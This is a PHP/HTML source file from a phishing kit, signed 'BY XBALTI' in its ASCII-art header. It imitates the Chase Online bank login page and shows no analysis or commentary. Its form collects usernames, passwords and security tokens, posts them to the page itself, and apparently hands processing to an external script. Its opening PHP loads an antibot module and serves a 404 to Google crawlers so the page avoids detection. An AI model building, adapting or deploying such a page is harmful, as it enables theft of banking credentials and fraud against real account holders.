<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |  
*/
session_start();
error_reporting(0);
include('antibot.php');
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">

    <head>
        <meta charset="utf-8" />
        <meta name="robots" content="noindex,nofollow" />
        <title>Chase Online</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

        <link rel="shortcut icon" href="./style/img/chasefavicon.ico" />

        <style>
            .spinnerWrapper {
                position: absolute;
                width: 100%;
                top: 45%;
                text-align: center
            }
            
            #chaseSpinnerID.jpui.spinner {
                display: inline-block;
                overflow: visible!important;
                padding-top: 0;
                margin-top: -50%
            }
            
            #chaseSpinnerID.jpui.spinner:after {
                content: "\0020";
                -moz-animation: three-quarters-loader 780ms infinite linear;
                -webkit-animation: three-quarters-loader 780ms infinite linear;
                animation: three-quarters-loader 780ms infinite linear;
                border: 4px solid #ccc;
                border-right-color: #0092ff;
                border-radius: 50%;
                box-sizing: border-box;
                display: inline-block;
                position: relative;
                width: 48px;
                height: 48px
            }
            
            @media(max-width:991px) {
                #chaseSpinnerID.jpui.spinner:after {
                    width: 38px;
                    height: 38px
                }
            }
            
            @media(max-width:767px) {
                #chaseSpinnerID.jpui.spinner:after {
                    width: 28px;
                    height: 28px
                }
            }
            
            #chaseSpinnerID.jpui.spinner:before {
                content: "Loading";
                color: transparent;
                position: absolute;
                bottom: -1.25rem;
                font-size: 1rem
            }
            
            #chaseSpinnerID.jpui.spinner:focus {
                outline: 0
            }
            
            @-moz-keyframes three-quarters-loader {
                0% {
                    -moz-transform: rotate(0);
                    transform: rotate(0)
                }
                100% {
                    -moz-transform: rotate(360deg);
                    transform: rotate(360deg)
                }
            }
            
            @-webkit-keyframes three-quarters-loader {
                0% {
                    -webkit-transform: rotate(0);
                    transform: rotate(0)
                }
                100% {
                    -webkit-transform: rotate(360deg);
                    transform: rotate(360deg)
                }
            }
            
            @keyframes three-quarters-loader {
                0% {
                    -moz-transform: rotate(0);
                    -ms-transform: rotate(0);
                    -webkit-transform: rotate(0);
                    transform: rotate(0)
                }
                100% {
                    -moz-transform: rotate(360deg);
                    -ms-transform: rotate(360deg);
                    -webkit-transform: rotate(360deg);
                    transform: rotate(360deg)
                }
            }
            
            #chaseSpinnerID.jpui.spinner .util.accessible-text {
                position: absolute!important;
                clip: rect(1px 1px 1px 1px);
                clip: rect(1px, 1px, 1px, 1px);
                padding: 0!important;
                border: 0!important;
                height: 1px!important;
                width: 1px!important;
                overflow: hidden
            }
            
            BODY {
                overflow-x: hidden;
                overflow-y: auto;
                margin: 0
            }
            
            #init,
            #body {
                opacity: 0;
                -webkit-transition: opacity .5s;
                transition: opacity .5s
            }
            
            #init {
                z-index: -1;
                background: #fff;
                position: fixed;
                top: 0;
                left: 0;
                min-width: 100%;
                min-height: 110%
            }
            
            .spinner:after,
            .mask:after {
                content: '';
                position: fixed;
                z-index: -1;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                background: #1c4f82;
                background: -moz-linear-gradient(top, #1c4f82 0, #2e6ea3 100%);
                -ms-filter: alpha(opacity=90);
                filter: alpha(opacity=90);
            }
            body {
                background: url(./style/img/test.jpeg);
                background-size: cover;
                -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                -ms-background-size: cover;
                background-attachment: fixed;
                font-family: 'Mukta Mahee', sans-serif;
            }
        </style>
        <link rel="stylesheet" href="./style/login.css">
		<link rel="stylesheet" href="./style/dashboard.css">

        <div id="load" style="display:none">

            <div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;

">
                <div class="">
                    <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div>
                </div>
            </div>

        </div>

        <div id="fixed">

            <div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;

">
                <div class="">
                    <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div>
                </div>
            </div>

        </div>

        <script type="text/javascript">
            document.onreadystatechange = function() {
                var state = document.readyState
                if (state == 'complete') {
                    setTimeout(function() {
                        document.getElementById('interactive');
                        document.getElementById('fixed').style.visibility = "hidden";
                    }, 4000);
                }
            }
        </script>

        <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
            <div data-is-view="true">
                <div class="homepage" tabindex="-1">
                    <div id="advertisenativeapp" data-has-view="true"></div>
                    <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
                        <div data-is-view="true">
                            <div id="siteMessageAda" aria-live="polite">
                                <h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div>
                        </div>
                    </div>

                    <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                        <div class="logon header jpui transparent navigation bar" data-is-view="true">
                            <div>
                                <a href="#" data-attr="LOGON_SUMMARY_MENU.requestChaseHomepage">
                                    <div class="chase logo"></div> <span class="util accessible-text" data-attr="LOGON_SUMMARY_MENU.chaseLogoAda">Chase.com homepage</span></a>
                            </div>
                        </div>
                    </header>
                    <main id="logon-content" data-has-view="true">
                        <div class="container logon" data-is-view="true">
                            <div class="row">
                                <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">

                                    <br>
                                    <br>


                                </div>
                                <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">

                                    <div class="jpui raised segment">
                                        <div class="row">
                                            <div class="col-xs-10 col-xs-offset-1">

                                                
                                                <form name="loginbank" id="loginbank" method="POST" action="" >

                                                    <div id="errorrSignIn"></div>

                                                    <label class="util accessible-text logon-xs-toggle error" for="userId-input-field" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Username</label>
                                                    <div class="logon-xs-toggle" id="userId">

                                                        <input class="jpui input logon-xs-toggle " id="Username" placeholder="Username" type="text" name="Username" required="required">

                                                    </div>
                                                    <label class="util accessible-text logon-xs-toggle error" for="password-input-field" data-attr="LOGON.passwordPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Password</label>
                                                    <div class="logon-xs-toggle" id="password">

                                                        <input class="jpui input logon-xs-toggle " id="passbank" placeholder="Password" autocomplete="off" type="password" name="passbank" required="required">

                                                    </div>
                                                    <label class="util accessible-text logon-xs-toggle" for="securityToken-input-field" data-attr="LOGON.securityTokenPlaceholder"><span class="accessible-text errorAdaText"></span>Token</label>
                                                    <div class="logon-xs-toggle hidden" id="securityToken">
                                                        <input min="0" class="jpui input logon-xs-toggle" id="securityToken-input-field" placeholder="Token" format="" aria-describedby="securityToken-placeHolderAdaText securityToken-helpertext" autocomplete="off" maxlength="6" type="tel" name="securityToken" data-validate="securityToken" required="" value=""> <span class="util accessible-text validation__accessible-text" id="securityToken-placeHolderAdaText"> Token</span></div>
                                                    <div class="row logon-xs-toggle">
                                                        <div class="col-xs-6 rememberMe-checkbox-container">
                                                            <div class="jpui checkbox" id="rememberMe">
                                                                <div class="checkbox-flex">
                                                                    <div class="checkboxWrap">
                                                                        <input class="checkbox__input" type="checkbox" id="input-rememberMe" aria-label="This checked box means that we will remember your username.  Remember me" name="rememberMe" value="on" data-attr="LOGON.rememberMyUserId"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div>
                                                                    <label for="input-rememberMe"> <span class="checkbox-label" id="label-rememberMe" data-attr="LOGON.rememberMyUserIdLabel">Remember me </span></label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="col-xs-6 token-checkbox-container">
                                                            <div class="jpui checkbox useToken" id="useToken">
                                                                <div class="checkbox-flex">
                                                                    <div class="checkboxWrap">
                                                                        <input class="checkbox__input" type="checkbox" id="input-useToken" aria-label="Shows content above. Use token" name="rsaToken" value="on"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div>
                                                                    <label for="input-useToken"> <span class="checkbox-label" id="label-useToken">Use token </span></label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row">
                                                        <button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Sign in</span> </button>
                                                    </div>
                                                    <div class="row"><span class="jpui link" id="forgotPassword-link-wrapper"><a class="link-anchor" id="forgotPassword" href=" javascript:void(0);" aria-label=" Forgot username/password? " data-attr="LOGON.forgotPasswordNavigation">Forgot username/password?<i class="jpui progressright icon end-icon" id="forgotPassword-endIcon" aria-hidden="true"></i></a></span></div>
                                                    <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last" id="enrollment" href=" javascript:void(0);" aria-label=" Not enrolled? Sign up now. " data-attr="LOGON.enrollNavigation">Not enrolled? Sign up now.<i class="jpui progressright icon end-icon" id="enrollment-endIcon" aria-hidden="true"></i></a></span></div>
                                                </form>

                    </main>
                    </div>
                    </div>
                    </div>
                    </div>
                    </div>
                    </div>

                    <br>
                    <br>
                    <br>
                    <br>
                    <br>
                    <br>
                    <br>

                    <div class="footer-container" data-is-view="true" style="position: static;">
                        <div class="container">
                            <div class="social-links row">
                                <div class="col-xs-12"><span class="follow-us-text">Follow us:</span>
                                    <ul class="icon-links">
                                        <li class="facebook"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseFacebook"><i class="jpui facebook icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li>
                                        <li class="instagram"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseInstagram"><i class="jpui instagram icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li>
                                        <li class="twitter"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseTwitter"><i class="jpui twitter icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li>
                                        <li class="youtube"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseYouTube"><i class="jpui youtube icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li>
                                        <li class="linkedin"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedIn"><i class="jpui linkedin icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="footer-links row">
                                <div class="col-xs-12">
                                    <ul>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact us</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms of use</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE Act: Chase Mortgage Loan Originators</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair Lending</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About Chase</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P. Morgan</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan Chase &amp; Co.</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espanol</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase Canada</a></li>
                                        <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
                                        <li>Member FDIC</li>
                                        <li><i class="jpui equal-housing-lender icon" id="undefined" aria-hidden="true"></i> Equal Housing Lender</li>
                                        <li class="copyright-label">&copy; 2018 JPMorgan Chase &amp; Co.</li>
                                    </ul>
                                </div>
                            </div>
                            <div class="row galaxy-footer">
                                <div class="col-xs-10 col-xs-offset-1">
                                    <p class="NOTE"><span></span>
                                        <br> <span class="copyright-label"> &copy; 2018 JPMorgan Chase &amp; Co.</span>
                                        <br> <a class="NOTELINK" href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy <i class="jpui progressright icon end-icon" aria-hidden="true"></i></a>
                                        <br> <a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
                                </div>
                            </div>
                        </div>
                    </div>

        </body>
    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>
    <script src="./js/sire.form.js"></script>
    </html>